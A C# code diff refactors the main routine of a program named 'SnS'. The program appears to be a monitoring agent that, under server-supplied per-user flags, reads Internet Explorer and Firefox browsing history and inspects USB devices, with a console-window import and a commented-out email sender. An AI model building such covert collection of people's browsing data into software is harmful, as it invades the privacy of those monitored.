@@ -16,7 +16,7 @@ using SnS.Classes.Requests;
 
 namespace SnS
 {
-    class MainFunction : settingsFile
+    class MainFunction
     {
         [DllImport("kernel32.dll")]
         static extern IntPtr GetConsoleWindow();
@@ -64,23 +64,20 @@ namespace SnS
             #endregion
 
             #region Settings
-            if (System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
+            try
             {
-                try
-                {
-                    SettingsRequest.getSettings();
-                    ApplicationsRequest.getApplications();
-                }
-                catch (Exception ex)
-                {
-                    settingsFile.setTrue();
-                    Console.WriteLine(ex);
-                }
+                SettingsRequest.getSettings();
+                ApplicationsRequest.getApplications();
+            }
+            catch (Exception ex)
+            {
+                GlobalVariables.setGuest();
+                Console.WriteLine(ex);
             }
             #endregion
 
             #region Email
-            //EmailSender.sendEmail();
+                //EmailSender.sendEmail();
             #endregion
 
             #region File Permission
@@ -104,7 +101,7 @@ namespace SnS
                 try
                 {
                     //USB SEQUENCE
-                    if (allowUSB == 1)
+                    if (GlobalVariables.user.allow_usb == 1)
                     {
                         UsbHandler.UsbInit();
                         UsbHandler.showUSB();
@@ -170,7 +167,7 @@ namespace SnS
 
                 try
                 {
-                    if (allowHistory == 1)
+                    if (GlobalVariables.user.allow_history == 1)
                     {
                         InternetExplorer testx = new InternetExplorer();
                         testx.GetHistory();
@@ -184,7 +181,7 @@ namespace SnS
 
                 try
                 {
-                    if (allowHistory == 1)
+                    if (GlobalVariables.user.allow_history == 1)
                     {
                         Firefox ff = new Firefox();
                         ff.GetHistory();
